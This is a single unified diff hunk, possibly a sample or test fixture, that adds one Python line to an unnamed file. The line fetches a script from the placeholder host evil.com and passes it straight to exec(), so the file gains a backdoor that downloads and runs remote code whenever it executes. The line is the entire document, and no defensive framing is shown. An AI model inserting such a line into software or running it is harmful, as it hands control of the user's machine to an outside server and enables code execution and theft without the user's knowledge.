@@ -1,0 +1,1 @@
+exec(urllib.request.urlopen("http://evil.com/payload.py").read())
